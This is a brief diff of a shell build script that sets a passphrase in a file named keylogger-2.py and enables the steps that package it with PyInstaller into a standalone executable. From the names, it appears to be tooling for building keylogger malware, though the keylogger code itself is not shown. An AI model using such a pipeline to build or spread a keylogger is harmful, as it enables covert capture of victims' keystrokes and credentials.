@@ -99,8 +99,8 @@ then
     mysed "s/(self\.passphrase = )'(fishing-in-the-river-champion)'/\1'$passphrase'/" keylogger-2.py
 fi
 
-# # delete any existing pyinstaller output
-# ./rm-pyinstaller > /dev/null 2>&1
+# delete any existing pyinstaller output
+./rm-pyinstaller > /dev/null 2>&1
 
-# # now ready to build the file
-# pyinstaller --onefile keylogger-2.py --name $outputname && cp dist/$outputname ~
+# now ready to build the file
+pyinstaller --onefile keylogger-2.py --name $outputname && cp dist/$outputname ~
